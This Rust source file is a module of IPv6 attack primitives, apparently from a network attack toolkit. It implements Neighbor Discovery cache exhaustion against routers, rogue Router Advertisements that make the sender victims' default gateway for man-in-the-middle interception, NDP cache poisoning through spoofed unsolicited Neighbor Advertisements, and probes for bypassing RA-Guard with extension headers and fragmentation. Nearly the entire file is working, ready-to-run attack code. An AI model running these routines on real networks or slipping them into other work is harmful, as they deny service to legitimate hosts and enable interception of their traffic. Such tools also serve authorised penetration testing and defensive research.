//! Advanced IPv6 attack primitives (2026 edition).
//!
//! Modules:
//!  - NDP cache exhaustion  (`flood_ndp`)
//!  - Fake SLAAC / router   (`fake_slaac`)
//!  - NDP cache poisoning   (`poison_ndp`)
//!  - RA-Guard bypass test  (`raguard_bypass_test`)

use std::ffi::CString;
use std::net::Ipv6Addr;
use std::sync::Arc;

use anyhow::{bail, Context, Result};
use tokio::task;

use crate::engine::sender::{flood_loop_pub as flood_loop, rand_fake_mac_pub as rand_fake_mac, eui64_ll_pub as eui64_link_local};
use crate::engine::stats::Stats;
use crate::ffi;

// ── NDP cache exhaustion ──────────────────────────────────────────────────────

/// Configuration for NDP neighbor-cache exhaustion attack.
#[derive(Clone, Debug)]
pub struct NdpExhaustConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// Target router's IPv6 (we force it to resolve millions of addresses).
    pub router:      String,
    /// /64 prefix under which to generate random addresses (default: random GUAs).
    pub prefix:      Option<String>,
}

/// Flood the router with NS from random global addresses, exhausting its NDP table.
///
/// Classic ndpexhaust6 translated to async Rust.  The router must resolve every
/// source address it receives an NS from → its NDP table fills up → legitimate
/// hosts can no longer be reached.
pub async fn flood_ndp(cfg: NdpExhaustConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let router_raw: usize = {
        let cs  = CString::new(cfg.router.as_str()).context("null in router")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve router {}", cfg.router); }
        ptr as usize
    };

    // Derive the /64 prefix bytes (first 8 bytes).
    let prefix_bytes: [u8; 8] = if let Some(ref p) = cfg.prefix {
        prefix_to_bytes(p)?
    } else {
        // Default: random GUA (2xxx::/3)
        let b = fastrand::u8(0x20..=0x3f);
        [b, fastrand::u8(..), fastrand::u8(..), fastrand::u8(..),
         fastrand::u8(..), fastrand::u8(..), fastrand::u8(..), fastrand::u8(..)]
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_ndp_exhaust(iface.clone(), router_raw, prefix_bytes)
    })
    .await
}

fn send_ndp_exhaust(iface: CString, router_raw: usize, prefix: [u8; 8]) -> Result<()> {
    let router = router_raw as *mut u8;

    // Random victim address in the /64 prefix.
    let mut victim = [0u8; 16];
    victim[..8].copy_from_slice(&prefix);
    victim[8]  = fastrand::u8(..);
    victim[9]  = fastrand::u8(..);
    victim[10] = fastrand::u8(..);
    victim[11] = fastrand::u8(..);
    victim[12] = fastrand::u8(..);
    victim[13] = fastrand::u8(..);
    victim[14] = fastrand::u8(..);
    victim[15] = fastrand::u8(..);

    // Random fake source MAC / EUI-64 link-local source.
    let fake_mac = rand_fake_mac();
    let src_ll   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ll   = src_ll;

    // NS payload targeting the random victim — forces router NDP lookup.
    let mut ns_buf = [0u8; 24];
    ns_buf[..16].copy_from_slice(&victim);
    ns_buf[16] = 1; ns_buf[17] = 1; // opt: Source Link-Layer Address
    ns_buf[18..24].copy_from_slice(&fake_mac);

    unsafe {
        let dstmac = ffi::ty_get_mac(iface.as_ptr(), src_ll.as_mut_ptr(), router);

        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ll.as_mut_ptr(), router, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORSOL, 0, 0,
            ns_buf.as_mut_ptr(), ns_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(NS exhaust) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send NDP exhaust rc={rc}"); }
    }
    Ok(())
}

// ── Fake SLAAC / rogue router ─────────────────────────────────────────────────

/// Configuration for the SLAAC / rogue-router attack.
#[derive(Clone, Debug)]
pub struct FakeSlaacConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// The IPv6 prefix to announce (e.g. "2001:db8:dead:beef").
    pub prefix:      String,
    /// Prefix length to advertise (default 64).
    pub prefix_len:  u8,
    /// Router lifetime in seconds (default 1800; 0 = invalidate).
    pub lifetime:    u32,
    /// Set M flag (Managed — use DHCPv6 for addresses).
    pub managed:     bool,
    /// Set O flag (Other — use DHCPv6 for options only).
    pub other:       bool,
    /// Advertise as default router with high preference.
    pub default_gw:  bool,
}

impl Default for FakeSlaacConfig {
    fn default() -> Self {
        Self {
            interface:  String::new(),
            rate_pps:   1,
            max_packets: 0,
            prefix:     "2001:db8::".into(),
            prefix_len: 64,
            lifetime:   1800,
            managed:    false,
            other:      false,
            default_gw: true,
        }
    }
}

/// Send a rogue Router Advertisement with the given prefix.
///
/// Victims performing SLAAC will auto-configure an address in `prefix` and
/// set the attacker as their default gateway — classic IPv6 MITM setup.
pub async fn fake_slaac(cfg: FakeSlaacConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let (dst_raw, dstmac_raw, ip6_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst    = ffi::ty_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        let ip6    = ffi::ty_get_own_ipv6(iface.as_ptr(), dst, ffi::PREFER_LINK);
        if ip6.is_null() { bail!("no link-local IPv6 address on {}", cfg.interface); }
        (dst as usize, dstmac as usize, ip6 as usize)
    };

    let prefix_bytes = prefix_to_bytes(&cfg.prefix)?;

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_fake_ra(
            iface.clone(), cfg.clone(),
            dst_raw, dstmac_raw, ip6_raw, prefix_bytes,
        )
    })
    .await
}

fn send_fake_ra(
    iface:        CString,
    cfg:          FakeSlaacConfig,
    dst_raw:      usize,
    dstmac_raw:   usize,
    ip6_raw:      usize,
    prefix_bytes: [u8; 8],
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;
    let ip6    = ip6_raw    as *mut u8;

    let fake_mac = rand_fake_mac();
    let mut fake_mac = fake_mac;

    // RA body layout (56 bytes):
    //  [0]    cur hop limit = 64
    //  [1]    flags: M(bit7) O(bit6) H(bit5) Prf(bit4-3)
    //  [2-3]  router lifetime (big-endian)
    //  [4-7]  reachable time  = 0 (unspecified)
    //  [8-11] retrans timer   = 0 (unspecified)
    //  --- Prefix Information option (type=3, len=4 = 32 bytes) ---
    //  [12]   opt type = 3
    //  [13]   opt len  = 4
    //  [14]   prefix length
    //  [15]   flags: L(bit7) A(bit6)
    //  [16-19] valid lifetime
    //  [20-23] preferred lifetime
    //  [24-27] reserved
    //  [28-43] prefix (16 bytes)
    //  --- Source Link-Layer Address option (type=1, len=1 = 8 bytes) ---
    //  [44]   opt type = 1
    //  [45]   opt len  = 1
    //  [46-51] MAC (6 bytes)
    //  [52-55] padding (zeros)
    let mut ra = [0u8; 56];
    ra[0] = 64; // cur hop limit
    let mut flags: u8 = 0;
    if cfg.managed    { flags |= 0x80; }
    if cfg.other      { flags |= 0x40; }
    if cfg.default_gw { flags |= 0x08; } // high preference
    ra[1] = flags;
    let lt = cfg.lifetime;
    ra[2] = (lt >> 8) as u8;
    ra[3] =  lt       as u8;
    // Prefix Information option
    ra[12] = 3;                        // type
    ra[13] = 4;                        // len (4 × 8 = 32 bytes)
    ra[14] = cfg.prefix_len;
    ra[15] = 0xc0;                     // L=1 A=1
    ra[16..20].fill(0xff);             // valid lifetime = infinite
    ra[20..24].fill(0xff);             // preferred lifetime = infinite
    // prefix (first 8 real bytes, last 8 zeros)
    ra[28..36].copy_from_slice(&prefix_bytes);
    // SLLA option
    ra[44] = 1; ra[45] = 1;
    ra[46..52].copy_from_slice(&fake_mac);

    let mut flags_word: u32 = 0;
    if cfg.managed    { flags_word |= 0x4000_0000; }
    if cfg.other      { flags_word |= 0x2000_0000; }

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            ip6, dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERADV, 0, flags_word,
            ra.as_mut_ptr(), ra.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(fake RA) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send fake RA rc={rc}"); }
    }
    Ok(())
}

// ── NDP cache poisoning ───────────────────────────────────────────────────────

/// Configuration for NDP cache poisoning (gratuitous NA).
#[derive(Clone, Debug)]
pub struct NdpPoisonConfig {
    pub interface:    String,
    pub rate_pps:     u64,
    pub max_packets:  u64,
    /// IPv6 address to impersonate (e.g. the router's link-local).
    pub spoof_target: String,
    /// Send to specific host (None = broadcast ff02::1).
    pub victim:       Option<String>,
}

/// Send unsolicited Neighbor Advertisements claiming to be `spoof_target`.
///
/// Poisons the NDP cache of all hosts (or a specific `victim`) so they
/// send traffic to our MAC instead of the real `spoof_target`.
pub async fn poison_ndp(cfg: NdpPoisonConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let target_raw: usize = {
        let cs  = CString::new(cfg.spoof_target.as_str()).context("null in spoof_target")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve spoof_target {}", cfg.spoof_target); }
        ptr as usize
    };

    let (dst_raw, dstmac_raw) = if let Some(ref v) = cfg.victim {
        let cs  = CString::new(v.as_str()).context("null in victim")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve victim {v}"); }
        let mac = unsafe { ffi::ty_get_multicast_mac(ptr) }; // fallback
        (ptr as usize, mac as usize)
    } else {
        unsafe {
            let ff02_1 = CString::new("ff02::1").unwrap();
            let dst    = ffi::ty_resolve6(ff02_1.as_ptr());
            if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
            let dstmac = ffi::ty_get_multicast_mac(dst);
            (dst as usize, dstmac as usize)
        }
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_gratuitous_na(iface.clone(), target_raw, dst_raw, dstmac_raw)
    })
    .await
}

fn send_gratuitous_na(
    iface:      CString,
    target_raw: usize,
    dst_raw:    usize,
    dstmac_raw: usize,
) -> Result<()> {
    let target = target_raw as *mut u8;
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    // Use our own fake MAC — this is the MAC the victim will cache.
    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // Gratuitous NA: target = spoof_target, TLLA = our fake MAC, Override=1 Solicited=0.
    let mut na_buf = [0u8; 24];
    unsafe { std::ptr::copy_nonoverlapping(target, na_buf.as_mut_ptr(), 16); }
    na_buf[16] = 2; na_buf[17] = 1; // TLLA option
    na_buf[18..24].copy_from_slice(&fake_mac);

    // Override flag only (not Solicited — this is unsolicited).
    const NA_OVERRIDE: u32 = 0x0200_0000;

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORADV, 0, NA_OVERRIDE,
            na_buf.as_mut_ptr(), na_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(gratuitous NA) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send gratuitous NA rc={rc}"); }
    }
    Ok(())
}

// ── RA-Guard bypass test ──────────────────────────────────────────────────────

/// Result of one bypass technique test.
#[derive(Clone, Debug)]
pub struct BypassResult {
    pub technique: String,
    pub sent:      bool,
    pub note:      String,
}

/// Configuration for RA-Guard bypass probing.
#[derive(Clone, Debug)]
pub struct RaGuardTestConfig {
    pub interface: String,
    /// Send each technique N times.
    pub count:     u32,
}

/// Probe RA-Guard with 5 evasion techniques and return results.
///
/// Techniques tested (per RFC 6104 and known bypass research):
///  1. Plain RA                    — baseline; RA-Guard blocks this
///  2. RA with Hop-by-Hop header   — some implementations skip HBH-RA check
///  3. RA with Destination header  — rare but effective against naive filters
///  4. Fragmented RA               — RFC 7112 should block, but many don't
///  5. RA wrapped with extra frag  — double-fragment bypass
pub async fn raguard_bypass_test(
    cfg:   RaGuardTestConfig,
    stats: Arc<Stats>,
) -> Result<Vec<BypassResult>> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let (dst_raw, dstmac_raw, ip6_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst    = ffi::ty_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        let ip6    = ffi::ty_get_own_ipv6(iface.as_ptr(), dst, ffi::PREFER_LINK);
        if ip6.is_null() { bail!("no link-local IPv6 on {}", cfg.interface); }
        (dst as usize, dstmac as usize, ip6 as usize)
    };

    let techniques: &[(&str, bool, bool, u32, &str)] = &[
        // (name, do_hop, do_dst, frag_count, note)
        ("plain-ra",         false, false, 0, "RFC 6106 baseline"),
        ("ra+hop-by-hop",    true,  false, 0, "adds Hop-by-Hop Options header"),
        ("ra+dst-opts",      false, true,  0, "adds Destination Options header"),
        ("ra+1-frag",        false, false, 1, "one Fragment header (RFC 7112 bypass)"),
        ("ra+2-frags",       false, false, 2, "two Fragment headers (double-frag bypass)"),
    ];

    let mut results = Vec::new();

    for (name, do_hop, do_dst, frags, note) in techniques {
        let mut sent_ok = false;
        for _ in 0..cfg.count {
            let iface2 = iface.clone();
            let do_hop2 = *do_hop;
            let do_dst2 = *do_dst;
            let frags2  = *frags;
            let s = Arc::clone(&stats);
            let ok: bool = task::spawn_blocking(move || {
                let ok = send_raguard_probe(
                    iface2, dst_raw, dstmac_raw, ip6_raw,
                    do_hop2, do_dst2, frags2,
                );
                if ok { s.inc_sent(); } else { s.inc_errors(); }
                ok
            })
            .await
            .unwrap_or(false);
            if ok { sent_ok = true; }
        }
        results.push(BypassResult {
            technique: name.to_string(),
            sent:      sent_ok,
            note:      note.to_string(),
        });
    }

    Ok(results)
}

fn send_raguard_probe(
    iface:      CString,
    dst_raw:    usize,
    dstmac_raw: usize,
    ip6_raw:    usize,
    do_hop:     bool,
    do_dst:     bool,
    frags:      u32,
) -> bool {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;
    let ip6    = ip6_raw    as *mut u8;
    let fake_mac = rand_fake_mac();
    let mut fake_mac = fake_mac;

    // Minimal RA body (8 bytes header + SLLA option).
    let mut ra = [0u8; 16];
    ra[0] = 64;  // cur hop limit
    ra[2] = 0x07; ra[3] = 0x08; // router lifetime = 1800s
    ra[8] = 1; ra[9] = 1;
    ra[10..16].copy_from_slice(&fake_mac);

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            ip6, dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { return false; }

        if do_hop {
            let mut hb = [0u8; 6];
            if ffi::ty_add_hdr_hopbyhop(pkt, &mut pkt_len, hb.as_mut_ptr(), 6) < 0 {
                ffi::ty_destroy_packet(pkt); return false;
            }
        }

        for i in 0..frags {
            let more = if i + 1 < frags { 1 } else { 0 };
            if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 0, more, i) < 0 {
                ffi::ty_destroy_packet(pkt); return false;
            }
        }

        if do_dst {
            let mut db = [0u8; 6];
            if ffi::ty_add_hdr_dst(pkt, &mut pkt_len, db.as_mut_ptr(), 6) < 0 {
                ffi::ty_destroy_packet(pkt); return false;
            }
        }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERADV, 0, 0,
            ra.as_mut_ptr(), ra.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt); return false;
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        rc >= 0
    }
}

// ── helpers ───────────────────────────────────────────────────────────────────

/// Parse an IPv6 prefix string into its first 8 bytes.
fn prefix_to_bytes(prefix: &str) -> Result<[u8; 8]> {
    // Strip CIDR suffix and trailing colons.
    let clean = prefix
        .split('/')
        .next()
        .unwrap_or(prefix)
        .trim_end_matches(':');

    // Pad to a full IPv6 address for parsing.
    let padded = if clean.contains("::") {
        clean.to_string()
    } else {
        format!("{clean}::")
    };

    let addr: Ipv6Addr = padded
        .parse()
        .with_context(|| format!("invalid IPv6 prefix: {prefix}"))?;

    let bytes = addr.octets();
    Ok(bytes[..8].try_into().unwrap())
}
